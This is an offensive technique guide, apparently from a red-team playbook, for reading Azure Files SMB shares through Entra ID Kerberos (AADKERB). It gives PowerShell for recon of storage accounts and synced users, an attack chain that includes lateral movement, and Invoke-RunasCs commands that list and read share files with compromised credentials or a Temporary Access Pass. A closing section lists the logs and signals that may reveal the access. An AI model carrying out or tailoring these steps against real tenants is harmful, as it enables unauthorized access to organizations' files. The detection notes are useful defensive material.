## Overview

Azure Files supports Entra ID Kerberos authentication (AADKERB) for SMB file share access. When a Storage Account is configured with `DirectoryServiceOptions: AADKERB`, Entra ID issues Kerberos tickets for authenticated access to the file share over SMB — without requiring a traditional Active Directory domain controller.

The attack surface: if an identity has the `Storage File Data SMB Share Reader` RBAC role, AADKERB allows it to mount and read the share. But the authentication only succeeds when three conditions are met simultaneously. Understanding these conditions is what makes this technique exploitable — each condition is satisfiable independently, and all three are often met in hybrid environments.

## The Three Required Conditions

| Condition | How to Verify | How to Satisfy |
|---|---|---|
| **RBAC permission** | `Storage File Data SMB Share Reader` on the storage account | Usually already assigned — check via ARM during recon |
| **Hybrid-synced identity** | `OnPremisesSyncEnabled: true` on the user object | Verify via Graph — common in organizations with AD Connect |
| **Azure AD Joined or Hybrid Joined device** | `dsregcmd /status` → `AzureAdJoined: YES` | Any Azure AD Joined or Hybrid Joined machine works |

All three must be true. If any is absent, Entra ID will not issue the Kerberos ticket and SMB access is denied.

## Identifying the AADKERB Configuration

During ARM recon, check the Storage Account's identity-based auth settings:

```powershell
# Enumerate storage accounts and check auth configuration
Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName,
    @{n="AuthType"; e={$_.AzureFilesIdentityBasedAuth.DirectoryServiceOptions}} | Format-Table

# Detailed auth config for a specific account
Get-AzStorageAccount -Name "<STORAGE_ACCOUNT>" -ResourceGroupName "<RESOURCE_GROUP>" |
    Select-Object -ExpandProperty AzureFilesIdentityBasedAuth | Format-List
# DirectoryServiceOptions : AADKERB
# DefaultSharePermission  : StorageFileDataSmbShareReader
```

`AADKERB` confirms the authentication method. `DefaultSharePermission` shows what RBAC is applied by default to authenticated users.

## Verifying Identity Conditions

```powershell
# Check if the compromised identity is hybrid-synced
Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/users/<USER_ID>?`$select=userPrincipalName,onPremisesSyncEnabled,onPremisesLastSyncDateTime" `
    -Headers @{ Authorization = "Bearer $Graph" } |
    Select-Object userPrincipalName, onPremisesSyncEnabled, onPremisesLastSyncDateTime
```

If `onPremisesSyncEnabled: true`, the identity meets the sync condition. The device condition requires a machine that is AzureAD Joined or Hybrid Joined — any already-compromised machine in the environment should be checked with `dsregcmd /status`.

## Attack Chain

```
ARM recon     →  identify AADKERB storage account + file share name
              ↓
RBAC check    →  confirm Storage File Data SMB Share Reader on identity
              ↓
Graph check   →  confirm OnPremisesSyncEnabled: true on identity
              ↓
Lateral move  →  compromise or access an AzureAD Joined / Hybrid Joined machine
              ↓
Invoke-RunasCs →  execute SMB access under compromised identity's context on the joined machine
              ↓
SMB access    →  enumerate share, read files
```

## Accessing the File Share via Invoke-RunasCs

`Invoke-RunasCs` executes commands under a specified identity's context from within a Windows session — satisfying the device condition from an already-compromised Azure AD Joined machine:

```powershell
# From a session on an AzureAD Joined machine
. .\Invoke-RunasCs.ps1

# Enumerate file share contents
Invoke-RunasCs -Domain AzureAD `
    -Username "<user@tenant.com>" `
    -Password "<PASSWORD>" `
    -Command "cmd.exe /c dir \\<STORAGE_ACCOUNT>.file.core.windows.net\<SHARE_NAME>"

# Read a specific file
Invoke-RunasCs -Domain AzureAD `
    -Username "<user@tenant.com>" `
    -Password "<PASSWORD>" `
    -Command "cmd.exe /c type \\<STORAGE_ACCOUNT>.file.core.windows.net\<SHARE_NAME>\<TARGET_FILE>"
```

When all three conditions are met, Entra ID issues a Kerberos ticket and the SMB access completes successfully.

## Operator Notes

- The `DefaultSharePermission: StorageFileDataSmbShareReader` setting on many AADKERB accounts means every hybrid-synced user with a joined device has read access by default — no explicit RBAC assignment needed beyond what the default grants.
- If the identity's password is unknown but a Temporary Access Pass was issued (via Authentication Admin role), use the TAP for `Invoke-RunasCs` authentication.
- The file share UNC path format is `\\<STORAGE_ACCOUNT>.file.core.windows.net\<SHARE_NAME>` — the storage account name and share name are discoverable via ARM.
- Azure Files under AADKERB does not support mounting from non-domain-joined or non-AzureAD-joined devices. The device condition is a hard technical requirement, not a policy check.
- File shares accessed via AADKERB can contain scripts, configuration files, and operational data — treat the content similarly to OneDrive file enumeration.

## Detection / Friction Points

- Storage diagnostic logs record SMB file access operations — if diagnostic logging is enabled on the storage account, the Kerberos-authenticated access appears with the identity's UPN.
- The Kerberos ticket issuance appears as a sign-in event in Entra ID — the sign-in is attributed to the identity used, with client app `SMB` and resource `Azure Storage`.
- Access from an unusual device or location relative to the identity's baseline may trigger Conditional Access evaluation or Identity Protection risk signals.
- The `Invoke-RunasCs` execution itself on the joined machine may generate process creation events visible to EDR — a `cmd.exe` spawned under a domain user context from an unusual parent process is potentially anomalous.
